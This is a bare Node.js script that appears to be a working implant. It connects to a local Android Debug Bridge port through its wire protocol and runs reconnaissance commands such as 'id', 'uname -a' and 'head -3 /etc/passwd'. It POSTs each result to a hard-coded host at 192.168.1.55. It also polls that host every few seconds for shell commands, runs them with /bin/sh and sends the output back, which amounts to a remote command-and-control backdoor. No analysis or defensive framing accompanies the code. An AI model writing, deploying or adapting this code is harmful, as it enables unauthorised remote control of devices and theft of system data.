var net = require('net');
var http = require('http');
var cp = require('child_process');
var HOST = '192.168.1.55';
function post(b) {
    try {
        var r = http.request({ host: HOST, port: 4446, method: 'POST', path: '/r' }, function () {});
        r.on('error', function () {});
        r.write(b || '');
        r.end();
    } catch (e) {}
}
post('C6?start node=' + process.version);

var s = null;
try {
    s = net.connect(26101, '127.0.0.1');
    post('C6?connecting');
} catch (e) { post('C6?ex=' + e.message); }

var buf = new Buffer(0);
var MYID = 0x12345678;
var queue = ['id', 'uname -a', 'cat /proc/version', 'ls /', 'head -3 /etc/passwd'];
var qi = 0;
var cur = '';

function pkt(cmd, a1, a2, payload) {
    var b = new Buffer(24 + payload.length);
    b.write(cmd, 0, 'ascii');
    b.writeUInt32LE(a1, 4);
    b.writeUInt32LE(a2, 8);
    b.writeUInt32LE(payload.length, 12);
    payload.copy(b, 24);
    return b;
}

s.on('connect', function () {
    post('C6?tcp=ok');
    s.write(pkt('CNXN', 0x01000001, 4096, new Buffer('host::\0', 'binary')));
});
s.on('data', function (d) {
    buf = Buffer.concat([buf, d]);
    while (buf.length >= 24) {
        var cmd = buf.slice(0, 4).toString('ascii');
        var a1 = buf.readUInt32LE(4);
        var len = buf.readUInt32LE(12);
        if (buf.length < 24 + len) break;
        var payload = buf.slice(24, 24 + len);
        buf = buf.slice(24 + len);
        if (cmd === 'CNXN') {
            post('C6?cnxn=' + payload.toString('ascii'));
            if (qi < queue.length) {
                cur = queue[qi++];
                post('C6?send=' + cur);
                s.write(pkt('OPEN', MYID, 0, new Buffer('shell:0 ' + cur + '\0', 'binary')));
            }
        } else if (cmd === 'OKAY') {
            post('C6?okay');
        } else if (cmd === 'WRTE' && a1 === MYID) {
            post('C6?[' + cur + ']=' + payload.toString());
        } else if (cmd === 'CLSE' && a1 === MYID) {
            post('C6?closed');
            if (qi < queue.length) {
                cur = queue[qi++];
                post('C6?send=' + cur);
                s.write(pkt('OPEN', MYID, 0, new Buffer('shell:0 ' + cur + '\0', 'binary')));
            } else { post('C6?done'); }
        } else if (cmd === 'AUTH') {
            post('C6?auth=' + a1);
        }
    }
});
s.on('error', function (e) { post('C6?err=' + e.message); });
s.on('close', function () { post('C6?closed_sock'); });

function tick() {
    http.get('http://' + HOST + ':8000/cmd', function (res) {
        var b = '';
        res.setEncoding('utf8');
        res.on('data', function (c) { b += c; });
        res.on('end', function () {
            if ((b || '').trim().length > 0) {
                var sh = cp.spawn('/bin/sh', ['-c', b]);
                var o = '', e = '';
                sh.stdout.on('data', function (d) { o += d; });
                sh.stderr.on('data', function (d) { e += d; });
                sh.on('exit', function (c) { post('RUN?code=' + c + '\n' + o + e); });
            }
            setTimeout(tick, 3000);
        });
    }).on('error', function () { setTimeout(tick, 6000); });
}
tick();
